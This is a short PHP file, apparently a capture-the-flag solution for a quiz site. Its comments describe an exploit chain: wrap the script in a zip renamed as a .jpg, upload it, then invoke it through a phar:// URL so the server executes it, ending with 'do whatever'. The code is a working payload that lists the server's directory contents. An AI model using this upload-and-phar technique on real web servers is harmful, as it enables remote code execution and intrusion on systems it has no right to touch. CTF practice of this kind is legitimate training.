<?php
// wrap this PHP file into a zip file
// rename it to xx.jpg
// upload by https://quiz.zoolab.org:23545/?p=uploaddddddd
// https://quiz.zoolab.org:23545/?p=phar://./images/61.219.145.50/vcmTfCJY1.jpg/a
// running this PHP code on server, do whatever ^^

if ($handle = opendir('.')) {
    while (($entry = readdir($handle)) !== false) {
        if ($entry != "." && $entry != "..") {
            echo "$entry<br>";
        }
    }
    closedir($handle);
}
